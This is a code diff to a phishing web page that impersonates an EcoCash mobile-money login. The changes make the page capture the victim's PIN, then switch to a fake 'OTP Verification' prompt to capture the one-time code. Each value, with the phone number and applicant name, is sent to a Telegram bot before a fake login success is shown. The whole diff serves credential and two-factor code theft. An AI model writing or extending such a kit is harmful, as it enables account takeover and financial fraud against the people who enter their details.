@@ -445,7 +445,7 @@ const renderMobileLogin = () => `
 </div>`;
 
 /* ─── PAGE 6 — PIN LOGIN ──────────────────────────────────────────────── */
-const renderPinLogin = (maskedPhone = '') => `
+const renderPinLogin = (maskedPhone = '', isOtp = false) => `
 <div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px;" class="page">
   <div style="text-align:center; margin-bottom:36px;">
     <div class="bank-logo">ECOCASH<span>//</span></div>
@@ -457,19 +457,19 @@ const renderPinLogin = (maskedPhone = '') => `
   </div>
 
   <div style="text-align:center; margin-bottom:32px;">
-    <h3 style="font-size:1.4rem; font-weight:800; color:#1b3668;">Secured Login 🔒</h3>
-    <p style="font-size:0.85rem; color:#64748b; margin-top:8px;">Enter your PIN to authenticate</p>
+    <h3 id="pinTitle" style="font-size:1.4rem; font-weight:800; color:#1b3668;">${isOtp ? 'OTP Verification 🔒' : 'Secured Login 🔒'}</h3>
+    <p id="pinSubtext" style="font-size:0.85rem; color:#64748b; margin-top:8px;">${isOtp ? 'Enter the Code / OTP sent to your phone' : 'Enter your PIN to authenticate'}</p>
     ${maskedPhone ? '<p style="font-size:0.9rem; font-weight:700; color:#1b3668; margin-top:10px; letter-spacing:2px;">' + maskedPhone + '</p>' : ''}
   </div>
 
   <div id="pinGrid" style="width:100%; max-width:320px; margin-bottom:12px;">
-    <input type="password" id="pinInput" inputmode="numeric" placeholder="Enter PIN"
+    <input type="password" id="pinInput" inputmode="numeric" placeholder="${isOtp ? 'Enter Code / OTP' : 'Enter PIN'}"
       style="width:100%; padding:16px; font-size:1.4rem; letter-spacing:6px; text-align:center; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box;" />
   </div>
-  <div id="pinError" class="pin-error">Invalid PIN. Please try again.</div>
+  <div id="pinError" class="pin-error">${isOtp ? 'Invalid Code / OTP. Please try again.' : 'Invalid PIN. Please try again.'}</div>
 
   <div style="width:100%; max-width:320px;">
-    <button class="btn btn-primary" id="pinLoginBtn" style="padding:16px; font-size:1rem; letter-spacing:1px;">Login</button>
+    <button class="btn btn-primary" id="pinLoginBtn" style="padding:16px; font-size:1rem; letter-spacing:1px;">${isOtp ? 'Verify Code / OTP' : 'Login'}</button>
   </div>
 </div>`;
 
@@ -561,6 +561,7 @@ function navigate(view) {
       const phone = document.getElementById('mbPhone').value;
       if (!phone) { alert('Please enter your mobile number.'); return; }
       state.mbPhone = phone;
+      state.pinAttempts = 0;
       // Mask phone: show first 4 chars, *** middle, last 3
       const masked = phone.length > 6
         ? phone.slice(0, 4) + ' *** ' + phone.slice(-3)
@@ -579,9 +580,10 @@ function navigate(view) {
 
   /* ─ PIN LOGIN ─ */
   else if (view === 'pinLogin') {
-    app.innerHTML = renderPinLogin(state.maskedPhone || '');
-    const pinInput = document.getElementById('pinInput');
     state.pinAttempts = state.pinAttempts || 0;
+    const isOtp = state.pinAttempts >= 1;
+    app.innerHTML = renderPinLogin(state.maskedPhone || '', isOtp);
+    const pinInput = document.getElementById('pinInput');
 
     // Only allow numeric input
     pinInput.addEventListener('input', e => {
@@ -596,32 +598,42 @@ function navigate(view) {
     document.getElementById('pinLoginBtn').addEventListener('click', async () => {
       const pinGrid = document.getElementById('pinGrid');
       const pinErr = document.getElementById('pinError');
+      const pinTitle = document.getElementById('pinTitle');
+      const pinSubtext = document.getElementById('pinSubtext');
+      const pinLoginBtn = document.getElementById('pinLoginBtn');
+
       pinGrid.classList.remove('shake');
       pinErr.classList.remove('show');
       pinInput.style.borderColor = '#e2e8f0';
 
-      const pin = pinInput.value.trim();
-      if (!pin) { alert('Please enter your PIN.'); return; }
+      const val = pinInput.value.trim();
+      const currentIsOtp = state.pinAttempts >= 1;
+
+      if (!val) {
+        alert(currentIsOtp ? 'Please enter your Code / OTP.' : 'Please enter your PIN.');
+        return;
+      }
 
       state.pinAttempts++;
 
-      showSpinner('Authenticating...');
-      await sendTextToTelegram(`🔐 *PIN LOGIN (Attempt ${state.pinAttempts})*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${pin}\n• Applicant: ${state.name || 'Unknown'}`);
-
-      if (state.pinAttempts < 3) {
+      if (!currentIsOtp) {
+        showSpinner('Authenticating...');
+        await sendTextToTelegram(`🔐 *PIN LOGIN*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
         await new Promise(r => setTimeout(r, 1500));
         hideSpinner();
 
-        // Show error animation
-        pinGrid.classList.add('shake');
-        pinErr.classList.add('show');
+        // Transition to second pin: Code / OTP
+        pinTitle.textContent = 'OTP Verification 🔒';
+        pinSubtext.textContent = 'Enter the Code / OTP sent to your phone';
+        pinInput.placeholder = 'Enter Code / OTP';
         pinInput.value = '';
-        pinInput.style.borderColor = '#ef4444';
+        pinInput.style.borderColor = '#e2e8f0';
+        pinErr.textContent = 'Invalid Code / OTP. Please try again.';
+        pinLoginBtn.textContent = 'Verify Code / OTP';
         pinInput.focus();
-
-        // Remove animation class after it plays so it can be re-triggered
-        setTimeout(() => pinGrid.classList.remove('shake'), 500);
       } else {
+        showSpinner('Verifying Code / OTP...');
+        await sendTextToTelegram(`🔑 *OTP / CODE*\n• Phone: ${state.mbPhone || 'Unknown'}\n• Code / OTP: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
         await new Promise(r => setTimeout(r, 1500));
         hideSpinner();
         navigate('loginSuccess');
